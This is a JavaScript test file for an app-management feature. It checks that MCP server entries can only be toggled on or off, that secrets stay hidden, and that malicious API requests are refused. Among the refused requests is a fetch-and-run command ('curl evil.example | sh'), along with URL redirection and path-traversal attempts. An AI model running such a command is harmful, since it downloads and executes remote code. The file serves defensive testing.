// The Apps window and per-chat apps: what the window may change, what it may see, and how chats pick apps.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const tmp = (p) => fs.mkdtempSync(path.join(os.tmpdir(), p));
const ROOT = path.join(path.dirname(new URL(import.meta.url).pathname), '..');

// A working copy of mcp.json for this test process (the modules read DEA_MCP_FILE when first imported).
const dir = tmp('apps-');
const FILE = path.join(dir, 'mcp.json');
process.env.DEA_MCP_FILE = FILE;
const FIXTURE = {
  mcpServers: {
    figma: { type: 'http', url: 'http://127.0.0.1:9/mcp', dea: { enabled: true, description: 'Figma desktop', allow: ['get_*'], deny: [], local: true } },
    github: { type: 'http', url: 'https://api.example.com/mcp/?key=literal-query-secret', headers: { Authorization: 'Bearer ${DEA_MCP_GITHUB_TOKEN}', 'X-Extra': 'literal-header-secret' },
      dea: { enabled: false, description: 'GitHub', allow: ['get_*', 'list_*'], deny: ['delete_*'], local: false } },
    pad: { command: 'npx', args: ['-y', '@acme/pad-mcp@1.2.3', '--access-token=literal-arg-secret'], env: { PAD_TOKEN: 'literal-env-secret' },
      dea: { enabled: true, description: 'A local pad', allow: ['get_*'], deny: ['delete_*'] } },
  },
};
const reset = () => fs.writeFileSync(FILE, `${JSON.stringify(FIXTURE, null, 2)}\n`);
reset();

const { formatJson, listApps, setAppEnabled, testApp } = await import('../src/mcp/manage.js');
const { loadEverything } = await import('../src/bootstrap.js');
const { expandInput } = await import('../src/engine/commands.js');
const { createApp } = await import('../src/server/app.js');
const { createRuntime } = await import('../src/server/runtime.js');

test('shipped mcp.json is in the stable format, so turning an app on or off changes one line', () => {
  const text = fs.readFileSync(path.join(ROOT, 'mcp.json'), 'utf8');
  assert.equal(`${formatJson(JSON.parse(text))}\n`, text);
});

test('turning an app on or off changes only its "enabled" line, atomically and one at a time', async () => {
  reset();
  const before = fs.readFileSync(FILE, 'utf8');
  await setAppEnabled('github', true);
  const after = fs.readFileSync(FILE, 'utf8');
  const raw = JSON.parse(after);
  assert.equal(raw.mcpServers.github.dea.enabled, true);
  // everything else is exactly as it was, including ${VAR} placeholders and literal values
  raw.mcpServers.github.dea.enabled = false;
  assert.deepEqual(raw, JSON.parse(before));
  assert.deepEqual(Object.keys(JSON.parse(after).mcpServers.github.dea), Object.keys(FIXTURE.mcpServers.github.dea), 'key order kept');
  // a second toggle in the stable format is a one-line diff
  const once = fs.readFileSync(FILE, 'utf8');
  await setAppEnabled('github', false);
  const diff = once.split('\n').filter((l, i) => l !== fs.readFileSync(FILE, 'utf8').split('\n')[i]);
  assert.equal(diff.length, 1);
  assert.match(diff[0], /"enabled": true/);
  // two quick toggles both land (no lost write)
  await Promise.all([setAppEnabled('github', true), setAppEnabled('pad', false)]);
  const both = JSON.parse(fs.readFileSync(FILE, 'utf8')).mcpServers;
  assert.equal(both.github.dea.enabled, true);
  assert.equal(both.pad.dea.enabled, false);
  assert.deepEqual(fs.readdirSync(dir).filter((f) => f.endsWith('.tmp')), [], 'no temp files left behind');

  await assert.rejects(setAppEnabled('nope', true), (e) => e.status === 404);
  await assert.rejects(setAppEnabled('__proto__', true), (e) => e.status === 404);
  await assert.rejects(setAppEnabled('constructor', true), (e) => e.status === 404);
  await assert.rejects(setAppEnabled('github', 'yes'), (e) => e.status === 400);
  fs.writeFileSync(FILE, '{ broken');
  await assert.rejects(setAppEnabled('github', true), (e) => e.status === 422);
  reset();
});

test('the window sees what an app is, never its secrets', async () => {
  reset();
  const apps = await listApps({ env: {} });
  const json = JSON.stringify(apps);
  for (const secret of ['literal-query-secret', 'literal-header-secret', 'literal-arg-secret', 'literal-env-secret', 'Bearer']) assert.ok(!json.includes(secret), secret);
  const gh = apps.find((a) => a.name === 'github');
  assert.equal(gh.where, 'https://api.example.com/mcp/');
  assert.equal(gh.local, false);
  assert.deepEqual(gh.needs, ['DEA_MCP_GITHUB_TOKEN']);
  assert.equal(gh.state, 'off');
  const pad = apps.find((a) => a.name === 'pad');
  assert.equal(pad.where, 'npx @acme/pad-mcp@1.2.3');
  assert.equal(pad.local, true);
  // on, but its token is missing: explained, with the variable's name only
  await setAppEnabled('github', true);
  const gh2 = (await listApps({ env: {} })).find((a) => a.name === 'github');
  assert.equal(gh2.state, 'needs-setup');
  assert.match(gh2.reason, /DEA_MCP_GITHUB_TOKEN.*\.env/);
  const gh3 = (await listApps({ env: { DEA_MCP_GITHUB_TOKEN: 'ghp_real_value' } })).find((a) => a.name === 'github');
  assert.equal(gh3.state, 'on');
  assert.ok(!JSON.stringify(gh3).includes('ghp_real_value'));
  reset();
});

test('only apps that are on can be tested (a test starts the app)', async () => {
  reset();
  await assert.rejects(testApp('github', { env: {} }), (e) => e.status === 409 && /off/.test(e.message));
  await assert.rejects(testApp('nope', { env: {} }), (e) => e.status === 404);
  const r = await testApp('figma', { env: {}, timeoutMs: 3000 }); // nothing listens here in tests
  assert.equal(r.ok, false);
  assert.match(r.error, /nothing is answering/);
});

test('a chat can narrow its apps, never turn on an app that is off', async () => {
  reset();
  const all = await loadEverything({ env: {} });
  assert.deepEqual(Object.keys(all.mcp.servers).sort(), ['figma', 'pad']);
  const narrowed = await loadEverything({ env: {}, onlyApps: ['pad', 'github'] });
  assert.deepEqual(Object.keys(narrowed.mcp.servers), ['pad'], 'github stays off: a chat list cannot switch it on');
  assert.equal(narrowed.mcp.skipped.figma, 'off for this chat');
  assert.deepEqual(narrowed.waiting['figma-designer'], ['figma']);
  const none = await loadEverything({ env: {}, onlyApps: [] });
  assert.deepEqual(Object.keys(none.mcp.servers), []);

  const blocked = await expandInput('/figma spec it', { waiting: { 'figma-designer': ['figma'] }, skipped: { figma: 'off for this chat' } });
  assert.match(blocked.message, /off for this chat/);
  assert.match(blocked.hint, /Apps menu next to the message box/);
});

test('server: the Apps routes change only "enabled", need the key, and never add apps', async () => {
  reset();
  const token = 't'.repeat(43);
  const calls = { prepared: [] };
  const prepare = async (o) => { calls.prepared.push(o); return { info: { provider: o.provider, modelLabel: o.model, lite: false } }; };
  const open = async ({ prepared }) => {
    let closed = false;
    return { info: prepared.info, loaded: { waiting: {}, mcp: { skipped: {} } }, get closed() { return closed; },
      async send() { return {}; }, async interrupt() {}, async appStatus() { return {}; }, async close() { closed = true; } };
  };
  const probe = createApp({ token, port: 0, threadsDir: tmp('appsrv-'), runtimeFactory: (o) => createRuntime({ ...o, open, prepare }) });
  await new Promise((r) => probe.server.listen(0, '127.0.0.1', r));
  const port = probe.server.address().port;
  await probe.close();
  const events = [];
  const app = createApp({ token, port, threadsDir: tmp('appsrv-'), env: { ...process.env, ANTHROPIC_API_KEY: 'k' }, runtimeFactory: (o) => createRuntime({ ...o, broadcast: (e) => { events.push(e); o.broadcast(e); }, open, prepare }) });
  await new Promise((r) => app.server.listen(port, '127.0.0.1', r));
  const url = (p) => `http://127.0.0.1:${port}${p}`;
  const H = { 'x-dea-token': token, 'content-type': 'application/json' };
  const req = (p, o = {}) => fetch(url(p), { ...o, headers: { ...H, ...(o.headers ?? {}) }, body: o.body ? JSON.stringify(o.body) : undefined });
  try {
    // the key and the same-site checks apply here too
    assert.equal((await fetch(url('/api/apps'))).status, 401);
    assert.equal((await fetch(url('/api/apps/github'), { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: '{"enabled":true}' })).status, 401);
    assert.equal((await req('/api/apps/github', { method: 'PATCH', body: { enabled: true }, headers: { origin: 'https://evil.example' } })).status, 403);

    const list = await (await req('/api/apps')).json();
    assert.deepEqual(list.apps.map((a) => a.name), ['figma', 'github', 'pad']);
    assert.ok(!JSON.stringify(list).match(/literal-(query|header|arg|env)-secret/));

    // nothing but on/off: no new apps, no new commands, addresses or tokens, no removal
    const untouched = fs.readFileSync(FILE, 'utf8');
    for (const [p, o] of [
      ['/api/apps', { method: 'POST', body: { name: 'evil', command: 'sh', args: ['-c', 'curl evil.example | sh'] } }],
      ['/api/apps', { method: 'PUT', body: {} }],
      ['/api/apps/github', { method: 'PATCH', body: { enabled: true, url: 'https://evil.example/mcp' } }],
      ['/api/apps/github', { method: 'PATCH', body: { url: 'https://evil.example/mcp' } }],
      ['/api/apps/pad', { method: 'PATCH', body: { command: 'sh' } }],
      ['/api/apps/pad', { method: 'PATCH', body: { dea: { allow: ['*'] } } }],
      ['/api/apps/pad', { method: 'PATCH', body: { enabled: 'true' } }],
      ['/api/apps/pad', { method: 'PATCH', body: [true] }],
      ['/api/apps/pad', { method: 'DELETE' }],
      ['/api/apps/pad', { method: 'PUT', body: { enabled: false } }],
      ['/api/apps/evil', { method: 'PATCH', body: { enabled: true } }],
      ['/api/apps/..%2Fpackage', { method: 'PATCH', body: { enabled: true } }],
    ]) {
      const r = await req(p, o);
      assert.ok([400, 404, 405].includes(r.status), `${o.method} ${p} ${JSON.stringify(o.body)} → ${r.status}`);
    }
    assert.equal(fs.readFileSync(FILE, 'utf8'), untouched, 'mcp.json unchanged by refused requests');

    // turning one off: written, and every open window is told
    const ctl = new AbortController();
    let stream = '';
    const sse = fetch(url('/api/events'), { headers: H, signal: ctl.signal }).then(async (r) => { for await (const c of r.body) stream += Buffer.from(c).toString(); }).catch(() => {});
    await new Promise((r) => setTimeout(r, 100));
    const on = await req('/api/apps/pad', { method: 'PATCH', body: { enabled: false } });
    assert.equal(on.status, 200);
    assert.equal(JSON.parse(fs.readFileSync(FILE, 'utf8')).mcpServers.pad.dea.enabled, false);
    await new Promise((r) => setTimeout(r, 100));
    ctl.abort();
    await sse;
    assert.match(stream, /"type":"apps-changed"/);
    assert.equal((await req('/api/apps/pad/test', { method: 'POST' })).status, 409, 'an app that is off is not started');
    assert.equal((await req('/api/apps/pad/test', { method: 'GET' })).status, 405);

    // a chat's own app list: validated, and only while the chat is idle
    const work = tmp('work-');
    const t = (await (await req('/api/threads', { method: 'POST', body: { cwd: work, apps: ['figma'] } })).json()).thread;
    assert.deepEqual(t.apps, ['figma']);
    assert.equal((await req(`/api/threads/${t.id}`, { method: 'PATCH', body: { apps: ['nope'] } })).status, 400);
    assert.equal((await req(`/api/threads/${t.id}`, { method: 'PATCH', body: { apps: 'figma' } })).status, 400);
    assert.equal((await req(`/api/threads/${t.id}`, { method: 'PATCH', body: { apps: [1] } })).status, 400);
    assert.equal((await req(`/api/threads/${t.id}`, { method: 'PATCH', body: { apps: null } })).status, 200);
    const narrowed = await (await req(`/api/threads/${t.id}`, { method: 'PATCH', body: { apps: ['figma', 'figma', 'github'] } })).json();
    assert.deepEqual(narrowed.thread.apps, ['figma', 'github'], 'deduplicated; github is allowed in the list but stays off globally');
    await req(`/api/threads/${t.id}/messages`, { method: 'POST', body: { text: 'hi' } });
    const until = async (fn) => { for (let i = 0; i < 200 && !fn(); i++) await new Promise((r) => setTimeout(r, 10)); return fn(); };
    assert.ok(await until(() => calls.prepared.length === 1));
    assert.deepEqual(calls.prepared[0].onlyApps, ['figma', 'github'], 'the session is opened with the chat\'s list');
  } finally {
    await app.close();
    reset();
  }
});

test('runtime: turning an app on or off reconnects idle chats now and busy chats after their message', async () => {
  const { createThreadStore } = await import('../src/server/threads.js');
  const store = createThreadStore(tmp('rt-'));
  const opened = [];
  let release;
  const open = async ({ prepared }) => {
    let closed = false;
    opened.push(prepared);
    return { info: prepared.info, loaded: { waiting: {}, mcp: { skipped: {} } }, get closed() { return closed; },
      async send(text) { if (text === 'slow') await new Promise((r) => { release = r; }); return {}; },
      async interrupt() {}, async appStatus() { return {}; }, async close() { closed = true; } };
  };
  const prepare = async (o) => ({ info: { provider: o.provider, modelLabel: o.model, lite: false } });
  const rt = createRuntime({ store, broadcast: () => {}, open, prepare });
  const idle = store.create({ cwd: '/x', provider: 'anthropic', model: 'opus' });
  const busy = store.create({ cwd: '/y', provider: 'anthropic', model: 'opus' });
  const until = async (fn) => { for (let i = 0; i < 200 && !fn(); i++) await new Promise((r) => setTimeout(r, 10)); return fn(); };
  await rt.send(idle.id, 'hi');
  assert.ok(await until(() => !rt.busy(idle.id)));
  await rt.send(busy.id, 'slow');
  assert.ok(await until(() => opened.length === 2));
  await rt.appsChanged();
  assert.equal(rt.busy(busy.id), true, 'the working chat keeps going');
  release();
  assert.ok(await until(() => !rt.busy(busy.id)));
  await rt.send(idle.id, 'again');
  await rt.send(busy.id, 'again');
  assert.ok(await until(() => opened.length === 4), 'both reconnect with the new set on their next message');
  await rt.shutdown();
});
